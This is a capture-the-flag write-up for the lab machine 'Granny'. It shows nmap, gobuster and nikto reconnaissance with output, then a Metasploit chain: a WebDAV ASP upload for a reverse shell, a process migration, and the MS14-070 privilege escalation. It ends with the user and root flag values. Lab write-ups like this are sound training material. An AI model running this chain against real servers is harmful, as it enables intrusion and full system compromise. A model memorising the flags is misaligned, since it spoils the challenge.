### IP
`10.10.10.15`

# Recon

### nmap
`nmap -sC -sV 10.10.10.15 -o Grannynmap`
```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-19 11:27 EST
Nmap scan report for 10.10.10.15
Host is up (0.11s latency).
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
| http-methods: 
|_  Potentially risky methods: TRACE DELETE COPY MOVE PROPFIND PROPPATCH SEARCH MKCOL LOCK UNLOCK PUT
| http-ntlm-info: 
|   Target_Name: GRANNY
|   NetBIOS_Domain_Name: GRANNY
|   NetBIOS_Computer_Name: GRANNY
|   DNS_Domain_Name: granny
|   DNS_Computer_Name: granny
|_  Product_Version: 5.2.3790
|_http-server-header: Microsoft-IIS/6.0
|_http-title: Under Construction
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Date: Thu, 19 Nov 2020 16:31:18 GMT
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, DELETE, COPY, MOVE, PROPFIND, PROPPATCH, SEARCH, MKCOL, LOCK, UNLOCK
|   Server Type: Microsoft-IIS/6.0
|_  Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.73 seconds
```
* Looks like theres a webserver on port 80
* We can see that WebDAV is running

### Gobuster
`gobuster dir -u http://10.10.10.15/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50 -o gobusterScan.txt`
```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.15/
[+] Threads:        50
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/11/19 11:32:36 Starting gobuster
===============================================================
/_private (Status: 301)
/_vti_bin/shtml.dll (Status: 200)
/_vti_bin (Status: 301)
/_vti_log (Status: 301)
/_vti_bin/_vti_aut/author.dll (Status: 200)
/_vti_bin/_vti_adm/admin.dll (Status: 200)
/aspnet_client (Status: 301)
/images (Status: 301)
/Images (Status: 301)
===============================================================
2020/11/19 11:32:49 Finished
===============================================================
```
* looks like any capialization of a directory works, which confirms that this is a windows machine
* `/_vti_bin` looks interesting
	* a quick google search reveals that the machine is probably running a [microsoft sharepoint server](https://social.technet.microsoft.com/Forums/sharepoint/en-US/9d496bd1-170f-4b87-b4b3-5f9ec760921f/sharepoint-service-30-vtibin-folder?forum=sharepointadminlegacy)
	* there's also some indication online that the [directory should not be accessible](https://hackmag.com/security/sharepoint-serving-the-hacker/), which means we have a vulnerability we can exploit  

### nikto
`nikto -h 10.10.10.15`
```
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          10.10.10.15
+ Target Hostname:    10.10.10.15
+ Target Port:        80
+ Start Time:         2020-11-19 11:30:52 (GMT-5)
---------------------------------------------------------------------------
+ Server: Microsoft-IIS/6.0
+ Retrieved microsoftofficewebserver header: 5.0_Pub
+ Retrieved x-powered-by header: ASP.NET
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ Uncommon header 'microsoftofficewebserver' found, with contents: 5.0_Pub
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ Retrieved x-aspnet-version header: 1.1.4322
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ OSVDB-397: HTTP method 'PUT' allows clients to save files on the web server.
+ OSVDB-5646: HTTP method 'DELETE' allows clients to delete files on the web server.
+ Retrieved dasl header: <DAV:sql>
+ Retrieved dav header: 1, 2
+ Retrieved ms-author-via header: MS-FP/4.0,DAV
+ Uncommon header 'ms-author-via' found, with contents: MS-FP/4.0,DAV
+ Allowed HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Allow' Header): 'MOVE' may allow clients to change file locations on the web server.
+ Public HTTP Methods: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH 
+ OSVDB-5646: HTTP method ('Public' Header): 'DELETE' may allow clients to remove files on the web server.
+ OSVDB-397: HTTP method ('Public' Header): 'PUT' method could allow clients to save files on the web server.
+ OSVDB-5647: HTTP method ('Public' Header): 'MOVE' may allow clients to change file locations on the web server.
+ WebDAV enabled (LOCK UNLOCK SEARCH PROPFIND MKCOL COPY PROPPATCH listed as allowed)
+ OSVDB-13431: PROPFIND HTTP verb may show the server's internal IP address: http://granny/_vti_bin/_vti_aut/author.dll
+ OSVDB-396: /_vti_bin/shtml.exe: Attackers may be able to crash FrontPage by requesting a DOS device, like shtml.exe/aux.htm -- a DoS was not attempted.
+ OSVDB-3233: /postinfo.html: Microsoft FrontPage default file found.
+ OSVDB-3233: /_private/: FrontPage directory found.
+ OSVDB-3233: /_vti_bin/: FrontPage directory found.
+ OSVDB-3233: /_vti_inf.html: FrontPage/SharePoint is installed and reveals its version number (check HTML source for more information).
+ OSVDB-3300: /_vti_bin/: shtml.exe/shtml.dll is available remotely. Some versions of the Front Page ISAPI filter are vulnerable to a DOS (not attempted).
+ OSVDB-3500: /_vti_bin/fpcount.exe: Frontpage counter CGI has been found. FP Server version 97 allows remote users to execute arbitrary system commands, though a vulnerability in this version could not be confirmed. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-1376. http://www.securityfocus.com/bid/2252.
+ OSVDB-67: /_vti_bin/shtml.dll/_vti_rpc: The anonymous FrontPage user is revealed through a crafted POST.
+ /_vti_bin/_vti_adm/admin.dll: FrontPage/SharePoint file found.
+ 8018 requests: 0 error(s) and 32 item(s) reported on remote host
+ End Time:           2020-11-19 11:40:35 (GMT-5) (583 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
* We can look at `/_vti_inf.html` for some extra info
	* Looking at the html source, it says `<!-- _vti_inf.html version 0.100>` and `FPVersion="5.0.2.6790"`
* `_vti_bin/fpcount.exe` apparently might let us execute arbitrary commands

# Exploitation

### webdav
* On `msfconsole`, we can run the following:
1. `search webdav`
2. `use exploit/windows/iis/iis_webdav_upload_asp` in order to get remote code execution
3. `set RHOST 10.10.10.15`
4. `set LHOST tun0` in order to have the machine connect back to yours
5. `run`
6. `ps` to find processes running with `NT AUTHORITY`
7. `migrate 3416` (pick the process id that your machine is running as described above)
8. `bg` to put the session into the background (keep note of the number)
9. `use post/multi/recon/local_exploit_suggester` in order to find scripts for privesc
10. `set SESSION 1` (use whatever session number your session was backgrounded to)
11. `set SHOWDESCRIPTION true` to see more details for each suggestion
12. `run`
13. `use exploit/windows/local/ms14_070_tcpip_ioctl` because we want to elevate the system
14. `set SESSION 1`
15. `set LHOST tun0`
16. `run`
```
* Now, we should have admin access. If not, go through the process and migrate steps again
* We can cd to `C:\Documents and Settings\Lakis\Desktop`
	* Using the `cat` command on the meterpreter or the `more` command on the shell, we get the user flag: `700c5dc163014e22b3e408f8703f67d1`

* We can cd to `C:\Documents and Settings\Administrator\Desktop>` to get the root flag: `aa4beed1c0584445ab463a6747bd06e9`